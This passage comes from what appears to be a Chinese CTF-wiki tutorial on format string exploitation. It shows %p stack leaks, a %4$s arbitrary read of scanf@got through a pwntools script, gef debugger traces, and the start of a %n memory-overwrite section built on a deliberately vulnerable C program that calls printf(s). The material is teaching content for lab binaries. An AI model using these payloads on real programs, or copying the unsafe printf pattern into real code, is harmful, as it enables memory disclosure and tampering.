\u53ef\u4ee5\u770b\u51fa\u5728\u6808\u4e0a\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57400xffffcd10\uff0c\u540c\u65f6\u8be5\u5730\u5740\u5b58\u50a8\u7684\u4e5f\u786e\u5b9e\u662f\u662f\"%s\"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002 \u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u8f93\u51fa\u51fd\u6570\u8c03\u7528\u65f6\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd9\u91cc\u5047\u8bbe\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u4e3a\u7b2ck\u4e2a\u53c2\u6570\u3002\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9\u3002 addr%k$s \u6ce8\uff1a \u5728\u8fd9\u91cc\uff0c\u5982\u679c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u6808\u4e0a\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e00\u5b9a\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\u6808\u6307\u9488\u81f3\u5c11\u4f4e\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57408\u5b57\u8282\u6216\u800516\u5b57\u8282\u3002 \u4e0b\u9762\u5c31\u662f\u5982\u4f55\u786e\u5b9a\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a\u7b2c\u51e0\u4e2a\u53c2\u6570\u7684\u95ee\u9898\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u786e\u5b9a [tag]%p%p%p%p%p%p... \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u91cd\u590d\u67d0\u4e2a\u5b57\u7b26\u7684\u673a\u5668\u5b57\u957f\u6765\u4f5c\u4e3atag\uff0c\u800c\u540e\u9762\u4f1a\u8ddf\u4e0a\u82e5\u5e72\u4e2a%p\u6765\u8f93\u51fa\u6808\u4e0a\u7684\u5185\u5bb9\uff0c\u5982\u679c\u5185\u5bb9\u4e0e\u6211\u4eec\u524d\u9762\u7684tag\u91cd\u590d\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u5f88\u5927\u628a\u63e1\u8bf4\u660e\u8be5\u5730\u5740\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u4e4b\u6240\u4ee5\u8bf4\u662f\u6709\u5f88\u5927\u628a\u63e1\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e0d\u6392\u9664\u6808\u4e0a\u6709\u4e00\u4e9b\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u8be5\u6570\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6781\u5176\u5c11\u89c1\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66f4\u6362\u5176\u4ed6\u5b57\u7b26\u8fdb\u884c\u5c1d\u8bd5\uff0c\u8fdb\u884c\u518d\u6b21\u786e\u8ba4\u3002\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5b57\u7b26'A'\u4f5c\u4e3a\u7279\u5b9a\u5b57\u7b26\uff0c\u540c\u65f6\u8fd8\u662f\u5229\u7528\u4e4b\u524d\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f\uff0c\u5982\u4e0b \u279c leakmemory git: ( master ) \u2717 ./leakmemory AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 00000001 .22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7% \u75310x41414141\u5904\u6240\u5728\u7684\u4f4d\u7f6e\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u6b63\u597d\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c5\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c4\u4e2a\u53c2\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e00\u4e0b \u279c leakmemory git: ( master ) \u2717 ./leakmemory %4 $s 00000001 .22222222.ffffffff.%4 $s [ 1 ] 61439 segmentation fault ( core dumped ) ./leakmemory \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bd5\u56fe\u5c06\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u503c\u4f5c\u4e3a\u5730\u5740\u8fdb\u884c\u89e3\u6790\uff0c\u4f46\u662f\u663e\u7136\u8be5\u503c\u6ca1\u6709\u529e\u6cd5\u4f5c\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u88ab\u89e3\u6790\uff0c\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u5d29\u6e83\u4e86\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8c03\u8bd5\u3002 \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffcd0c' , 'l8' ] 8 0xffffcd0c\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd20 \u2192 \"%4 $s \" 0xffffcd14\u2502+0x08: 0xffffcd20 \u2192 \"%4 $s \" 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: \"%4 $s \" \u2190 $eax 0xffffcd24\u2502+0x18: 0xffffce00 \u2192 0x00000000 0xffffcd28\u2502+0x1c: 0x000000e0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd20 \"%4$s\") [ #1] 0x80484ce \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 help x/ Examine memory: x/FMT ADDRESS. ADDRESS is an expression for the memory address to examine. FMT is a repeat count followed by a format letter and a size letter. Format letters are o ( octal ) , x ( hex ) , d ( decimal ) , u ( unsigned decimal ) , t ( binary ) , f ( float ) , a ( address ) , i ( instruction ) , c ( char ) , s ( string ) and z ( hex, zero padded on the left ) . Size letters are b ( byte ) , h ( halfword ) , w ( word ) , g ( giant, 8 bytes ) . The specified number of objects of the specified size are printed according to the format. Defaults for format and size letters are those previously used. Default count is 1 . Default address is following last thing printed with this command or \"print\" . gef\u27a4 x/x 0xffffcd20 0xffffcd20: 0x73243425 gef\u27a4 vmmap Start End Offset Perm Path 0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory 0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory 0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory 0x0804b000 0x0806c000 0x00000000 rw- [ heap ] 0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so 0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so 0xf7fae000 0xf7fb1000 0x00000000 rw- 0xf7fd3000 0xf7fd5000 0x00000000 rw- 0xf7fd5000 0xf7fd7000 0x00000000 r-- [ vvar ] 0xf7fd7000 0xf7fd9000 0x00000000 r-x [ vdso ] 0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffb000 0xf7ffc000 0x00000000 rw- 0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so 0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so 0xffedd000 0xffffe000 0x00000000 rw- [ stack ] gef\u27a4 x/x 0x73243425 0x73243425: Cannot access memory at address 0x73243425 \u663e\u71360xffffcd20\u5904\u6240\u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u53d8\u91cf\u503c0x73243425\u5e76\u4e0d\u80fd\u591f\u88ab\u6539\u7a0b\u5e8f\u8bbf\u95ee\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u81ea\u7136\u5d29\u6e83\u4e86\u3002 \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684\u5730\u5740\u5462\uff1f\u6bd4\u5982\u8bf4scanf@got\uff0c\u7ed3\u679c\u4f1a\u600e\u4e48\u6837\u5462\uff1f\u5e94\u8be5\u81ea\u7136\u662f\u8f93\u51fascanf\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u6211\u4eec\u4e0d\u59a8\u6765\u8bd5\u4e00\u4e0b\u3002 \u9996\u5148\uff0c\u83b7\u53d6scanf@got\u7684\u5730\u5740\uff0c\u5982\u4e0b \u8fd9\u91cc\u4e4b\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528printf\u51fd\u6570\uff0c\u662f\u56e0\u4e3ascanf\u51fd\u6570\u4f1a\u5bf90a\uff0c0b\uff0c0c\uff0c00\u7b49\u5b57\u7b26\u6709\u4e00\u4e9b\u5947\u602a\u7684\u5904\u7406\uff0c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u8bfb\u5165\uff0c\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u8bd5\u8bd5\u3002\u3002\u3002\u3002 gef\u27a4 got /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\uff1a \u6587\u4ef6\u683c\u5f0f elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__ 0804a00c R_386_JUMP_SLOT printf@GLIBC_2.0 0804a010 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 0804a014 R_386_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 \u4e0b\u9762\u6211\u4eec\u5229\u7528pwntools\u6784\u9020payload\u5982\u4e0b from pwn import * sh = process ( './leakmemory' ) leakmemory = ELF ( './leakmemory' ) __isoc99_scanf_got = leakmemory . got [ '__isoc99_scanf' ] print hex ( __isoc99_scanf_got ) payload = p32 ( __isoc99_scanf_got ) + '%4$s' print payload gdb . attach ( sh ) sh . sendline ( payload ) sh . recvuntil ( '%4$s \\n ' ) print hex ( u32 ( sh . recv ()[ 4 : 8 ])) # remove the first bytes of __isoc99_scanf@got sh . interactive () \u5176\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528gdb.attach(sh)\u6765\u8fdb\u884c\u8c03\u8bd5\u3002\u5f53\u6211\u4eec\u8fd0\u884c\u5230\u7b2c\u4e8c\u4e2aprintf\u51fd\u6570\u7684\u65f6\u5019(\u8bb0\u5f97\u4e0b\u65ad\u70b9)\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u7b2c\u56db\u4e2a\u53c2\u6570\u786e\u5b9e\u6307\u5411\u6211\u4eec\u7684scanf\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u8f93\u51fa \u2192 0xf7615670 < printf + 0 > call 0xf76ebb09 < __x86 . get_pc_thunk . ax > \u21b3 0xf76ebb09 < __x86 . get_pc_thunk . ax + 0 > mov eax , DWORD PTR [ esp ] 0xf76ebb0c < __x86 . get_pc_thunk . ax + 3 > ret 0xf76ebb0d < __x86 . get_pc_thunk . dx + 0 > mov edx , DWORD PTR [ esp ] 0xf76ebb10 < __x86 . get_pc_thunk . dx + 3 > ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffbbf8dc' , 'l8' ] 8 0xffbbf8dc \u2502 + 0x00 : 0x080484ce \u2192 < main + 99 > add esp , 0x10 \u2190 $ esp 0xffbbf8e0 \u2502 + 0x04 : 0xffbbf8f0 \u2192 0x0804a014 \u2192 0xf76280c0 \u2192 < __isoc99_scanf + 0 > push ebp 0xffbbf8e4 \u2502 + 0x08 : 0xffbbf8f0 \u2192 0x0804a014 \u2192 0xf76280c0 \u2192 < __isoc99_scanf + 0 > push ebp 0xffbbf8e8 \u2502 + 0x0c : 0x000000c2 0xffbbf8ec \u2502 + 0x10 : 0xf765c6bb \u2192 < handle_intel + 107 > add esp , 0x10 0xffbbf8f0 \u2502 + 0x14 : 0x0804a014 \u2192 0xf76280c0 \u2192 < __isoc99_scanf + 0 > push ebp \u2190 $ eax 0xffbbf8f4 \u2502 + 0x18 : \"%4$s\" 0xffbbf8f8 \u2502 + 0x1c : 0x00000000 \u540c\u65f6\uff0c\u5728\u6211\u4eec\u8fd0\u884c\u7684terminal\u4e0b \u279c leakmemory git :( master ) \u2717 python exploit . py [ + ] Starting local process './leakmemory' : pid 65363 [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory' Arch : i386 - 32 - little RELRO : Partial RELRO Stack : No canary found NX : NX enabled PIE : No PIE ( 0x8048000 ) 0x804a014 \\ x14 \\ xa0 \\ x0 % 4 $ s [ * ] running in new terminal : / usr / bin / gdb - q \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\" 65363 [ + ] Waiting for debugger : Done 0xf76280c0 [ * ] Switching to interactive mode [ * ] Process './leakmemory' stopped with exit code 0 ( pid 65363 ) [ * ] Got EOF while reading in interactiv \u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86scanf\u7684\u5730\u5740\u3002 \u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u8bf4\u6240\u6709\u7684\u504f\u79fb\u673a\u5668\u5b57\u957f\u7684\u6574\u6570\u500d\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u76f4\u63a5\u76f8\u5e94\u53c2\u6570\u6765\u83b7\u53d6\uff0c\u6709\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145\uff0c\u6765\u4f7f\u5f97\u6211\u4eec\u60f3\u8981\u6253\u5370\u7684\u5730\u5740\u5185\u5bb9\u7684\u5730\u5740\u4f4d\u4e8e\u673a\u5668\u5b57\u957f\u6574\u6570\u500d\u7684\u5730\u5740\u5904\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8fd9\u4e2a\u6837\u5b50\u3002 [padding][addr] \u6ce8\u610f \u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u8f93\u5165\\x0c\\xa0\\x04\\x08%4$s\u8fd9\u662f\u56e0\u4e3a\u867d\u7136\u524d\u9762\u7684\u786e\u5b9e\u662fprintf@got\u7684\u5730\u5740\uff0c\u4f46\u662f\uff0cscanf\u51fd\u6570\u5e76\u4e0d\u4f1a\u5c06\u5176\u8bc6\u522b\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4f1a\u5c06\\,x,0,c\u5206\u522b\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8fdb\u884c\u8bfb\u5165\u3002\u4e0b\u9762\u5c31\u662f\u9519\u8bef\u7684\u4f8b\u5b50\u3002 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"\\x0c\\xa0\\x04\\x08%4 $s \" 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"\\x0c\\xa0\\x04\\x08%4 $s \" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"\\x0c\\xa0\\x04\\x08%4 $s \" \u2190 $eax 0xffffcd14\u2502+0x18: \"\\xa0\\x04\\x08%4 $s \" 0xffffcd18\u2502+0x1c: \"\\x04\\x08%4 $s \" \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd10 \"\\\\x0c\\\\xa0\\\\x04\\\\x08%4$s\") [ #1] 0x80484ce \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 x/x 0xffffcd10 0xffffcd10: 0x6330785c \u8986\u76d6\u5185\u5b58 \u00b6 \u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u6cc4\u9732\u6808\u5185\u5b58\u4ee5\u53ca\u4efb\u610f\u5730\u5740\u5185\u5b58\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4fee\u6539\u6808\u4e0a\u53d8\u91cf\u7684\u503c\u5462\uff0c\u751a\u81f3\u4fee\u6539\u4efb\u610f\u5730\u5740\u53d8\u91cf\u7684\u5185\u5b58\u5462?\u7b54\u6848\u662f\u53ef\u884c\u7684\uff0c\u53ea\u8981\u53d8\u91cf\u5bf9\u5e94\u7684\u5730\u5740\u53ef\u5199\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u4fee\u6539\u5176\u5bf9\u5e94\u7684\u6570\u503c\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u60f3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u7c7b\u578b %n,\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u5c0f\u6280\u5de7\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\uff0c\u8fd9\u91cc\u4ecd\u7136\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u4e3a\u8986\u76d6\u6808\u4e0a\u7684\u53d8\u91cf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4e3a\u8986\u76d6\u6307\u5b9a\u5730\u5740\u7684\u53d8\u91cf\u3002 \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\u3002 /* example/overflow/overflow.c */ #include <stdio.h> int a = 123 , b = 456 ; int main () { int c = 789 ; char s [ 100 ]; printf ( \"%p \\n \" , & c ); scanf ( \"%s\" , s ); printf ( s ); if ( c == 16 ) { puts ( \"modified c.\" ); } else if ( a == 2 ) { puts ( \"modified a for a small number.\" ); } else if ( b == 0x12345678 ) { puts ( \"modified b for a big number!\" ); } return 0 ; } makefile\u5728\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u800c\u65e0\u8bba\u662f\u8986\u76d6\u54ea\u4e2a\u5730\u5740\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u57fa\u672c\u4e0a\u90fd\u662f\u6784\u9020\u7c7b\u4f3c\u5982\u4e0b\u7684payload ...[overwrite addr]....%[overwrite offset]$n \u5176\u4e2d...\u8868\u793a\u6211\u4eec\u7684\u586b\u5145\u5185\u5bb9\uff0coverwrite addr \u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\uff0coverwrite offset\u5730\u5740\u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e3a\u8f93\u51fa\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\uff0c\u4e5f\u662f\u5982\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u8986\u76d6\u5730\u5740 \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb \u8fdb\u884c\u8986\u76d6 \u8986\u76d6\u6808\u5185\u5b58 \u00b6 \u786e\u5b9a\u8986\u76d6\u5730\u5740 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u81ea\u7136\u662f\u6765\u60f3\u529e\u6cd5\u77e5\u9053\u6808\u53d8\u91cfc\u7684\u5730\u5740\u3002\u7531\u4e8e\u76ee\u524d\u51e0\u4e4e\u4e0a\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u5f00\u542f\u4e86aslr\u4fdd\u62a4\uff0c\u6240\u4ee5\u6808\u7684\u5730\u5740\u4e00\u76f4\u5728\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u6545\u610f\u8f93\u51fa\u4e86c\u53d8\u91cf\u7684\u5730\u5740\u3002 \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb \u00b6 \u5176\u6b21\uff0c\u6211\u4eec\u6765\u786e\u5b9a\u4e00\u4e0b\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u662fprintf\u5c06\u8981\u8f93\u51fa\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570()\u3002 \u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u4e4b\u524d\u7684\u6cc4\u9732\u6808\u53d8\u91cf\u6570\u503c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u64cd\u4f5c\u3002\u901a\u8fc7\u8c03\u8bd5 \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffcd0c' , 'l8' ] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 